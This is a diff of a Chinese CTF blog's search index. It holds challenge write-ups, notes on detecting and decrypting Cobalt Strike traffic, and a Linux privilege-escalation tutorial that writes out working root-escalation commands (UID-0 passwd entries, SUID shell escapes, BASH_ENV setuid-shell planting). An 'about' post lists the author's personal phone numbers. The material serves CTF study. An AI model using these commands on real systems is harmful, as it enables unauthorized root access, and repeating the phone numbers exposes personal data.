@@ -1,82 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2024冬季春秋杯部分wp</title>
-    <url>/2025/01/2024%E5%86%AC%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
-    <content><![CDATA[全部解析可以在春秋伽玛的公众号上看到
-这里仅是本人写的部分wp
-1.See anything in these pics?拿到一个zip和二维码
-二维码拖进这个网站扫一下 QR Code Decoder | QR Code Scanner
-得到5FIVE，解压zip，拿到一张图片
-因为提示我们不止一张图片，于是我们foremost一下
-又得到一个图片
-图片拖进随波逐流直接出了,原来是宽高改了
+    <title>18届软件创新攻防赛部分wp</title>
+    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
+    <content><![CDATA[1.钓鱼邮件拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：
 
 
+发现有一个生日礼物.zip，点击下载
+下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111
 
 
-2.简单算术拿到ysxdg&#x2F;m@]mjkz@vl@zlf&gt;b
-提示我们想想异或
-拖进随波逐流，暴力解密xor，keylength选2以上的，然后筛选有flag的，直接出了
+然后发现一个exe，双击运行。
+然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe
+因为会实时变化，记得要截图看会好看一点。
 
 
+放大就能看到这个远程地址 222.218.218.218:55555
 
 
-3.简单镜像提取还是比较简单的
-拿到一个压缩包然后得到一个流量
-我话不多说直接foremost得到一个img，点不开
-然后我又foremost这个img就能拿到一个zip和一个xls
-点开这个xls就能看到flag了
-
-
-
-
-4.压力大，写个脚本吧点开这个压缩包就明白了，意思是有100个zip，password是旁边这个txt经过base64解码后的，需要我们写脚本爆破他。
-脚本
-import osimport zipfileimport base64def extract_nested_zips_with_base64_password(initial_zip_path):    &quot;&quot;&quot;    解压嵌套压缩包，密码存储在对应的 `password_xx.txt` 文件中，并经过 Base64 解码。    文件解压到当前目录。    参数：    - initial_zip_path (str): 初始压缩包的路径。    &quot;&quot;&quot;    current_zip_path = initial_zip_path    while True:        # 获取当前压缩包的编号        base_name = os.path.splitext(os.path.basename(current_zip_path))[0]        zip_number = base_name.split(&#x27;_&#x27;)[-1]  # 提取编号部分        password_file = f&quot;password_&#123;zip_number&#125;.txt&quot;  # 对应的密码文件名        # 检查密码文件是否存在        if not os.path.exists(password_file):            print(f&quot;未找到密码文件: &#123;password_file&#125;，无法继续解压 &#123;current_zip_path&#125;&quot;)            break        # 读取密码并进行 Base64 解码        try:            with open(password_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as pf:                encoded_password = pf.read().strip()                password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)  # 解码 Base64 密码        except Exception as e:            print(f&quot;处理密码文件 &#123;password_file&#125; 时出错: &#123;e&#125;&quot;)            break        # 解压当前压缩包        try:            with zipfile.ZipFile(current_zip_path, &#x27;r&#x27;) as zip_ref:                files = zip_ref.namelist()                if not files:                    print(f&quot;&#123;current_zip_path&#125; 是空压缩包。&quot;)                    break                # 筛选出下一个压缩包，忽略非 `.zip` 文件（如密码文件）                next_zip_path = None                for file_name in files:                    zip_ref.extract(file_name, os.getcwd(), pwd=bytes(password, &#x27;utf-8&#x27;))                    print(f&quot;&#123;password&#125;&quot;)                    # 如果是 `.zip` 文件，记录路径以便继续解压                    if file_name.endswith(&#x27;.zip&#x27;):                        next_zip_path = os.path.join(os.getcwd(), file_name)        except RuntimeError as e:            print(f&quot;解压 &#123;current_zip_path&#125; 时密码错误或其他问题: &#123;e&#125;&quot;)            break        except zipfile.BadZipFile as e:            print(f&quot;&#123;current_zip_path&#125; 不是有效的压缩包: &#123;e&#125;&quot;)            break        # 如果没有下一个 `.zip` 文件，说明解压结束        if not next_zip_path:            print(f&quot;解压完成。最终文件存储在当前目录&quot;)            break        current_zip_path = next_zip_path  # 更新路径，继续解压下一个 `.zip` 文件# 参数设置initial_zip_path = &#x27;zip_99.zip&#x27;  # 初始压缩包名称# 执行函数extract_nested_zips_with_base64_password(initial_zip_path)
-
-然后把得到一个flag-hint.txt是PASSWORD+PASSWORD.png
-我们需要把所有密码连起来，去重，然后010得到一个png
-就能得到flag了
-5.音频的秘密得到的音频提示是deepsound
-我们使用deepsound2.2，发现需要密码（注意这里不能用deepsound2.0）
-密码提示是弱密码，经尝试是123
-然后得到一个flag.zip
-由于是store压缩方式，所以尝试明文攻击
-
-
-然后得到了flag.png，lsb提取一下即可
-
-
-
-
-6.Infinity题目给了一个png，可以foremost一下得到一个压缩包，点开发现还是一个压缩包，再点开还是一个压缩包，可以看出来是多层压缩包要写个脚本循环解压。
-脚本
-import osimport zipfileimport tarfileimport py7zr# 记录每层压缩包名字的列表compressed_files = []def extract_archive(archive_path):    global compressed_files    # 用于存储待解压的文件队列    to_extract = [archive_path]    # 用于记录已经解压过的文件    extracted = set()    while to_extract:        file_path = to_extract.pop(0)        if file_path in extracted:            continue        # 记录当前压缩包的名字        compressed_files.append(file_path)        extracted.add(file_path)        file_extension = os.path.splitext(file_path)[1].lower()        if file_extension == &#x27;.zip&#x27;:            # 解压zip文件            try:                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:                    zip_ref.extractall(os.path.dirname(file_path))            except zipfile.BadZipFile:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 ZIP 文件或已损坏。&quot;)        elif file_extension == &#x27;.7z&#x27;:            # 解压7z文件            try:                with py7zr.SevenZipFile(file_path, mode=&#x27;r&#x27;) as z:                    z.extractall(os.path.dirname(file_path))            except py7zr.Bad7zFile:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 7z 文件或已损坏。&quot;)        elif file_extension in [&#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tar.bz2&#x27;]:            # 解压tar文件            try:                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:                    tar_ref.extractall(os.path.dirname(file_path), filter=&#x27;data&#x27;)            except tarfile.ReadError:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 tar 文件或已损坏。&quot;)        else:            print(f&quot;不支持的文件格式: &#123;file_path&#125;&quot;)            continue        # 查找新生成的压缩包并添加到待解压队列        for root, dirs, files in os.walk(os.path.dirname(file_path)):            for file in files:                new_file_path = os.path.join(root, file)                new_extension = os.path.splitext(new_file_path)[1].lower()                if new_extension in [&#x27;.zip&#x27;, &#x27;.7z&#x27;, &#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tar.bz2&#x27;]:                    to_extract.append(new_file_path)if __name__ == &quot;__main__&quot;:    # 输入要解压的压缩包路径    archive_path = input(&quot;请输入压缩包的路径: &quot;)    if os.path.exists(archive_path):        extract_archive(archive_path)        print(&quot;每层压缩包的名字:&quot;)        for file in compressed_files:            print(file)    else:        print(&quot;输入的路径不存在，请检查后重新输入。&quot;)
-
-最后解压出来一个SeCr3t.txt
-内容是 Inf1nityIsS0CoOL
-然后将得到的文件名字由内而外（即倒过来）连起来，这里可以用cyberchef的reverse
-由于题目提示：BASE58-Ripple、SM4-ECB
-
-
-这里SM4的key就是之前的内容
-将保存下来的内容010一下得到png，就能得到这样一个png
-
-
-然后二维码扫一下就可以了，网站： QR Code Decoder | QR Code Scanner
-
-
-出了
+包上md5得到flag：df3101212c55ea8c417ad799cfc6b509
 ]]></content>
       <categories>
         <category>CTF</category>
         <category>WP</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
+        <tag>CTF</tag>
         <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACMer</title>
+    <url>/2024/11/ACMer/</url>
+    <content><![CDATA[还没想好写啥
+
+https://www.bilibili.com/video/BV1MoZAYyEUk?t=2.0
+]]></content>
+      <tags>
+        <tag>ACM</tag>
       </tags>
   </entry>
   <entry>
@@ -260,8 +222,8 @@ python get_pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10
         <category>WP</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
+        <tag>CTF</tag>
         <tag>WP</tag>
       </tags>
   </entry>
@@ -436,11 +398,440 @@ from ultralytics import YOLOimport numpy as npfrom PIL import Imageimport timeim
       </tags>
   </entry>
   <entry>
+    <title>Linux提权浅析</title>
+    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
+    <content><![CDATA[passwd提权/etc/passwd和 /etc/shadow文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 passwd或 shadow文件的内容或权限配置有误，则可以被利用来进行系统提权。
+我们先了解一下 /etc/passwd内容的含义：
+Linux 密码信息保存在两个文件中，分别为：/etc/passwd和 /etc/shadow
+/etc/passwd文件用于保存用户信息，每一行代表一个用户，每一行通过冒号 :分为七个部分:
+
+用户名
+密码，若为 x则表示密码保存在/etc/shadow
+UID，0 代表 root
+GID，表示所在组
+描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other
+用户主目录
+默认 shell 类型
+
+例如，假设 /etc/passwd文件中其中一行信息如下：
+
+其含义解读如下：
+​	*用户名：test-user
+​	*密码保存在 /etc/shadow中
+​	*UID 为 1001
+​	*GID 为 1001
+​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]
+​	*用户主目录为 /home/test-user
+​	*默认 shell 为 /bin/bash
+因此在登陆时候的权限是通过第三个字段 UID和第四个字段 GID确定。其中 UID=0代表 root 用户
+如果我们能够对 /etc/passwd文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。
+所以，获取passwd的写入权限十分重要
+通常来说，通过 /etc/passwd提权的方法有两种：
+
+如果具有 /etc/passwd的 w (写入) 权限，可以直接添加一个 root 权限的用户
+如果 /etc/passwd中存储 root 用户密码哈希，可以使用 john 进行破解
+
+场景一：&#x2F;etc&#x2F;passwd 具有写权限查看
+ls -alh /etc/passwd /etc/shadow
+
+如果有 --wx--xrwx 意味着我们具有写入权限，接下来我们需要做的就是
+自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 UID设置为 0，此时我们登陆就可以获取 root 权限。
+查看 passwd 文件中 root 用户数据的格式
+cat /etc/passwd|grep root
+
+结果
+root:x:0:0:root:/root:/bin/bash
+
+先设置用户名，如syl-passwd
+syl-passwd:x:0:0:root:/root:/bin/bash
+
+设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 openssl套件
+使用 openssl创建一个密码为 pass123 的 linux hash，命令如下：
+openssl passwd -1 -salt ignite pass123#-1 ：使用 MD5 hash 算法#-salt ：对 hash 算法加 &quot;盐&quot;
+
+计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：
+syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
+
+添加到passwd
+echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd#必须使用单引号，不能使用双引号#使用 &gt;&gt;，而不是 &gt;
+
+这样即添加成功，也可以再次查看一下
+cat /etc/passwd|grep syl-passwd
+
+接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限
+场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash一样查看读写权限
+ls -alh /etc/passwd /etc/shadow
+
+但是发现权限配置都是正确的，普通用户只具有 /etc/passwd文件的读权限。
+接下来查看 /etc/passwd文件的内容：
+cat /etc/passwd
+
+结果发现
+root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash
+
+中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了
+先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：
+echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt# 此处必须单引号
+
+然后就john：
+john ~/hash.txt
+
+最后得到密码是hello
+接下来就一样了，su root，提权。
+shadow提权shadow提权与passwd类似
+都是获取root密码的哈希值然后进行爆破
+SUID提权什么是suid提权？
+SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。
+suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。
+linux引入了3个文件来管理用户组：
+
+&#x2F;etc&#x2F;passwd存放用户信息。
+&#x2F;etc&#x2F;shadow存放用户密码信息。
+&#x2F;etc&#x2F;group存放组信息
+
+利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。
+如何设置suid列出所有文件：
+ls -al
+
+设置suid：
+chmod u+s filename #设置suidchmod u-s filename #去除suid
+
+如果文件从-rw变成了-rwS说明添加上了suid权限
+注意：
+
+只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义
+命令执行者要对该程序文件拥有执行(x)权限才能使用
+SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效
+
+具有suid权限的二进制可执行文件有：
+nmapvimfindbashmorelessnanocpawk
+
+
+
+如何查找查找系统上运行的suid文件，且查找具有root权限的
+find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;# /表示从文件系统的顶部（根）开始并找到每个目录# -perm 表示搜索随后的权限# -u = s表示查找root用户拥有的文件# -type表示我们正在寻找的文件类型# f 表示常规文件，而不是目录或特殊文件# 2表示该进程的第二个文件描述符，即stderr（标准错误）# &gt;表示重定向# /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。
+
+查找如下：
+
+
+ls一下看看是否设置了suid权限
+ls -al /usr/bin/su#查看/usr/bin/su有无suid权限
+
+如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。
+进行提权这里的前提都是要有suid权限
+如果之前查找到的usr/bin/find具有root权限，就用find命令进行提权
+findfind filename -exec whoami \; -quit# rootfind filename -exec /bin/sh -p \; -quit# whoami# root# 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su
+
+还有一种差不多的提权方法
+#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限touch 1.txt #创建1.txt/usr/bin/find 1.txt -exec whoami \;
+
+好像也可以：
+find /etc/passwd -exec /bin/bash -p \;
+
+如果最后出了个root就说明提权成功了
+同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：
+
+
+
+suid文件
+提权命令
+
+
+
+&#x2F;usr&#x2F;bin&#x2F;bash
+bash -p
+
+
+&#x2F;usr&#x2F;bin&#x2F;csh
+csh -b
+
+
+&#x2F;usr&#x2F;bin&#x2F;sh
+sh -p
+
+
+&#x2F;usr&#x2F;bin&#x2F;ksh
+ksh -p
+
+
+&#x2F;usr&#x2F;bin&#x2F;zsh
+zsh
+
+
+&#x2F;usr&#x2F;bin&#x2F;find
+find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;
+
+
+&#x2F;usr&#x2F;bin&#x2F;awk
+awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’
+
+
+&#x2F;usr&#x2F;bin&#x2F;man
+!&#x2F;bin&#x2F;bash
+
+
+&#x2F;usr&#x2F;bin&#x2F;more
+!&#x2F;bin&#x2F;bash
+
+
+利用相关命令均可在这个网站上查询：GTFOBins
+namp适用版本：nmap2.02至5.21。
+nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。
+首先是进入nmap交互模式
+nmap --interactive
+
+之后利用命令进行提权
+nmap&gt; !shsh-3.2# whoamiroot
+
+
+
+less&#x2F;more使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用!命令进入shell。
+less与more相似，以less为例
+less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令
+less /etc/passwd
+
+之后进入交互界面，输入
+!/bin/sh
+
+VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profilevless /etc/profilev:shell
+
+就可以进入交互界面然后写入shell的
+nanonano进入shell页面似乎比较简单
+nanoctrl + Rctrl + X#shell
+
+
+
+cp&#x2F;mv以cp为例
+主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权
+whoami#qszd
+
+openssl passwd -1 -salt test testaaa
+
+echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd
+
+cat /etc/passwd
+
+su - test
+
+
+
+vi&#x2F;vimvim为例
+首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是
+vim.tiny /etc/passwd
+
+:!/bin/sh
+
+
+
+BASH_ENV提权
+前提知识: 在Linux中，.bashrc 被用来初始化交互shell，而 BASH_ENV 用来初始化非交互shell; 
+就是说只要是在 BASH_ENV 变量中写入的语句，在每个shell脚本执行前，都会执行一次。
+
+由此可见，使用BASH_ENV提权,只要按照以下3个步骤即可:
+
+得到一个linux管理员使用su命令的账户;
+定义BASH_ENV变量;
+等待linux管理员使用su切换到root，执行某个脚本;
+
+第三步也可以运行那种暂时提高到root的程序脚本
+写入环境变量
+echo &#x27;cp /bin/bash /tmp/root_shell; chmod +xs /tmp/root_shell&#x27; &gt; /tmp/exploit export BASH_ENV=/tmp/exploit  #写入exploit到环境变量中
+
+接下来执行程序就可以拿到shell了
+/tmp/root_shell -p  # 获取 root shell
+
+或者直接在root里面找flag
+export BASH_ENV=/tmp/test.sh  echo &#x27;cat /root/flag &gt; /tmp/root.txt 2&gt;&amp;1&#x27; &gt; /tmp/test.sh  #写入执行程序cat /tmp/root.txt  #读取
+
+
+
+其他提权通过查询历史记录从而获得信息泄露的信息利用以下命令可以获取
+cat ~/.bash_history
+
+这个命令可以查看当前用户使用过的历史命令
+有可能会得到root登录的密码
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024冬季春秋杯部分wp</title>
+    <url>/2025/01/2024%E5%86%AC%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
+    <content><![CDATA[全部解析可以在春秋伽玛的公众号上看到
+这里仅是本人写的部分wp
+1.See anything in these pics?拿到一个zip和二维码
+二维码拖进这个网站扫一下 QR Code Decoder | QR Code Scanner
+得到5FIVE，解压zip，拿到一张图片
+因为提示我们不止一张图片，于是我们foremost一下
+又得到一个图片
+图片拖进随波逐流直接出了,原来是宽高改了
+
+
+
+
+2.简单算术拿到ysxdg&#x2F;m@]mjkz@vl@zlf&gt;b
+提示我们想想异或
+拖进随波逐流，暴力解密xor，keylength选2以上的，然后筛选有flag的，直接出了
+
+
+
+
+3.简单镜像提取还是比较简单的
+拿到一个压缩包然后得到一个流量
+我话不多说直接foremost得到一个img，点不开
+然后我又foremost这个img就能拿到一个zip和一个xls
+点开这个xls就能看到flag了
+
+
+
+
+4.压力大，写个脚本吧点开这个压缩包就明白了，意思是有100个zip，password是旁边这个txt经过base64解码后的，需要我们写脚本爆破他。
+脚本
+import osimport zipfileimport base64def extract_nested_zips_with_base64_password(initial_zip_path):    &quot;&quot;&quot;    解压嵌套压缩包，密码存储在对应的 `password_xx.txt` 文件中，并经过 Base64 解码。    文件解压到当前目录。    参数：    - initial_zip_path (str): 初始压缩包的路径。    &quot;&quot;&quot;    current_zip_path = initial_zip_path    while True:        # 获取当前压缩包的编号        base_name = os.path.splitext(os.path.basename(current_zip_path))[0]        zip_number = base_name.split(&#x27;_&#x27;)[-1]  # 提取编号部分        password_file = f&quot;password_&#123;zip_number&#125;.txt&quot;  # 对应的密码文件名        # 检查密码文件是否存在        if not os.path.exists(password_file):            print(f&quot;未找到密码文件: &#123;password_file&#125;，无法继续解压 &#123;current_zip_path&#125;&quot;)            break        # 读取密码并进行 Base64 解码        try:            with open(password_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as pf:                encoded_password = pf.read().strip()                password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)  # 解码 Base64 密码        except Exception as e:            print(f&quot;处理密码文件 &#123;password_file&#125; 时出错: &#123;e&#125;&quot;)            break        # 解压当前压缩包        try:            with zipfile.ZipFile(current_zip_path, &#x27;r&#x27;) as zip_ref:                files = zip_ref.namelist()                if not files:                    print(f&quot;&#123;current_zip_path&#125; 是空压缩包。&quot;)                    break                # 筛选出下一个压缩包，忽略非 `.zip` 文件（如密码文件）                next_zip_path = None                for file_name in files:                    zip_ref.extract(file_name, os.getcwd(), pwd=bytes(password, &#x27;utf-8&#x27;))                    print(f&quot;&#123;password&#125;&quot;)                    # 如果是 `.zip` 文件，记录路径以便继续解压                    if file_name.endswith(&#x27;.zip&#x27;):                        next_zip_path = os.path.join(os.getcwd(), file_name)        except RuntimeError as e:            print(f&quot;解压 &#123;current_zip_path&#125; 时密码错误或其他问题: &#123;e&#125;&quot;)            break        except zipfile.BadZipFile as e:            print(f&quot;&#123;current_zip_path&#125; 不是有效的压缩包: &#123;e&#125;&quot;)            break        # 如果没有下一个 `.zip` 文件，说明解压结束        if not next_zip_path:            print(f&quot;解压完成。最终文件存储在当前目录&quot;)            break        current_zip_path = next_zip_path  # 更新路径，继续解压下一个 `.zip` 文件# 参数设置initial_zip_path = &#x27;zip_99.zip&#x27;  # 初始压缩包名称# 执行函数extract_nested_zips_with_base64_password(initial_zip_path)
+
+然后把得到一个flag-hint.txt是PASSWORD+PASSWORD.png
+我们需要把所有密码连起来，去重，然后010得到一个png
+就能得到flag了
+5.音频的秘密得到的音频提示是deepsound
+我们使用deepsound2.2，发现需要密码（注意这里不能用deepsound2.0）
+密码提示是弱密码，经尝试是123
+然后得到一个flag.zip
+由于是store压缩方式，所以尝试明文攻击
+
+
+然后得到了flag.png，lsb提取一下即可
+
+
+
+
+6.Infinity题目给了一个png，可以foremost一下得到一个压缩包，点开发现还是一个压缩包，再点开还是一个压缩包，可以看出来是多层压缩包要写个脚本循环解压。
+脚本
+import osimport zipfileimport tarfileimport py7zr# 记录每层压缩包名字的列表compressed_files = []def extract_archive(archive_path):    global compressed_files    # 用于存储待解压的文件队列    to_extract = [archive_path]    # 用于记录已经解压过的文件    extracted = set()    while to_extract:        file_path = to_extract.pop(0)        if file_path in extracted:            continue        # 记录当前压缩包的名字        compressed_files.append(file_path)        extracted.add(file_path)        file_extension = os.path.splitext(file_path)[1].lower()        if file_extension == &#x27;.zip&#x27;:            # 解压zip文件            try:                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:                    zip_ref.extractall(os.path.dirname(file_path))            except zipfile.BadZipFile:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 ZIP 文件或已损坏。&quot;)        elif file_extension == &#x27;.7z&#x27;:            # 解压7z文件            try:                with py7zr.SevenZipFile(file_path, mode=&#x27;r&#x27;) as z:                    z.extractall(os.path.dirname(file_path))            except py7zr.Bad7zFile:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 7z 文件或已损坏。&quot;)        elif file_extension in [&#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tar.bz2&#x27;]:            # 解压tar文件            try:                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:                    tar_ref.extractall(os.path.dirname(file_path), filter=&#x27;data&#x27;)            except tarfile.ReadError:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 tar 文件或已损坏。&quot;)        else:            print(f&quot;不支持的文件格式: &#123;file_path&#125;&quot;)            continue        # 查找新生成的压缩包并添加到待解压队列        for root, dirs, files in os.walk(os.path.dirname(file_path)):            for file in files:                new_file_path = os.path.join(root, file)                new_extension = os.path.splitext(new_file_path)[1].lower()                if new_extension in [&#x27;.zip&#x27;, &#x27;.7z&#x27;, &#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tar.bz2&#x27;]:                    to_extract.append(new_file_path)if __name__ == &quot;__main__&quot;:    # 输入要解压的压缩包路径    archive_path = input(&quot;请输入压缩包的路径: &quot;)    if os.path.exists(archive_path):        extract_archive(archive_path)        print(&quot;每层压缩包的名字:&quot;)        for file in compressed_files:            print(file)    else:        print(&quot;输入的路径不存在，请检查后重新输入。&quot;)
+
+最后解压出来一个SeCr3t.txt
+内容是 Inf1nityIsS0CoOL
+然后将得到的文件名字由内而外（即倒过来）连起来，这里可以用cyberchef的reverse
+由于题目提示：BASE58-Ripple、SM4-ECB
+
+
+这里SM4的key就是之前的内容
+将保存下来的内容010一下得到png，就能得到这样一个png
+
+
+然后二维码扫一下就可以了，网站： QR Code Decoder | QR Code Scanner
+
+
+出了
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>CTF</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Before-everthing</title>
     <url>/2024/11/Before-everthing/</url>
     <content><![CDATA[这里是MetaVi的Blog主要更新一些学习上的问题，简单的笔记和写题的记录…尽量使自己学有所得–
 ——————————
 作者VX:x3289444724作者QQ:3289444724联系电话:①13968975069②18072320271]]></content>
+  </entry>
+  <entry>
+    <title>Network Traffic Analysis</title>
+    <url>/2025/02/Network-Traffic-Analysis/</url>
+    <content><![CDATA[写在前面感觉流量分析真的是MISC中的一个大项，开一篇专门的文章好学习流量分析
+CS流量——CobaltStrike流量
+“Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。”
+一些细节知识可以看这个 Cobalt Strike | Defining Cobalt Strike Components &amp; BEACON | Google Cloud Blog
+更多CS流量相关看 前言 | Cobalt Strike
+
+Cobalt Strike 服务端和客户端是通过 SSL 加密通讯的 (默认证书对 cobaltstrike.store )。
+Beacon 的元数据传输过程中虽然使用的是 RSA 算法，但是 Beacon 任务的传输使用的却是 AES 算法加密的，而 AES 密钥则是 Beacon 随机生成的然后通过 RSA 交换 AES密钥。加解密算法为 AES ，密钥位长 128 ，CBC 模式，填充标准 PKCS7 ，其通信具体流程如下。
+
+
+流量传递Cobalt Strike 分为 客户端 与 服务端 ，服务端是一个，客户端可以有多个，可被团队进行分布式协作操作。
+Cobalt Strike 的 Beacon 支持异步通信和交互式通信。Beacon 可以选择通过 DNS 还是 HTTP 协议出口网络，你甚至可以在使用Beacon 通讯过程中切换 HTTP 和 DNS。其支持多主机连接，部署好 Beacon 后提交一个要连回的域名或主机的列表，Beacon 将通过这些主机轮询。
+http-beacon 通信中，默认使用 GET 方法向 /dpixel 、/__utm.gif 、/pixel.gif 等地址发起请求，同时 Cobalt Strike 的Beacon 会将元数据（例如AES密钥）使用 RSA 公钥加密后发送给 C2 服务器。
+这些元数据通常被编码为 Base64 字符串并作为 Cookie 发送。如下图：
+流量特征cs流量的http通讯一般会有以下的特征
+比如搜索http类型数据后查看到有出现post请求/sumbit.php？id=xxx的特征，该特征可以判断 cobalt strike。
+这是因为cs在下发特征时会请求这个/sumbit.php？id=xxx，同时 POST 传递了一串 0000 开头的16进制数据，这是 cs 流量的发送任务数据（可以根据这个辨别cs），任务数据里的内容十分重要，如下：
+
+
+
+
+心跳包特征：
+间隔一定时间，均有通信，且流级上的上下行数据长度固定；
+使用Wireshark等网络抓包工具，可以捕获到后门的HTTP数据包“GET &#x2F;4Ekx HTTP&#x2F;1.1”，其中的 “4Ekx”就是心跳包，通过查看心跳包获取一般cs心跳包会有4个数字或者字母组成。
+https特征：
+https-beacon 通信中，默认使用空证书建立加密通道，流量中可以看见这一过程。
+在数据包的client hello中，数据包有JA3（JA3 是由 John Althouse、Jeff Atkinson 和 Josh Atkins 创建的开源项目。 JA3 &#x2F; JA3S 可以为客户端和服务器之间的通信创建 SSL 指纹。）
+和操作系统有关，每个操作系统都有固定的值。这里列出几个已知的 ja3 &#x2F; ja3s 指纹信息，这个值在不同操作系统上是不一样的
+JA3
+
+72a589da586844d7f0818ce684948eea
+a0e9f5d64349fb13191bc781f81f42e1
+
+JA3s
+
+b742b407517bac9536a77a7b0fee28e9
+ae4edc6faf64d08308082ad26be60767
+
+解密那拿到的cs流量我们怎么解密呢？
+大致是需要三样东西： .cobaltstrike.beacon_keys 文件、cookie元数据、submit.php的data
+第一种方法：
+这种一步到位
+有了这三样东西我们便可以直接执行脚本，项目地址 5ime&#x2F;CS_Decrypt: CobaltStrike流量解密脚本
+安装库：
+pip install hexdump javaobj-py3
+
+脚本如下：
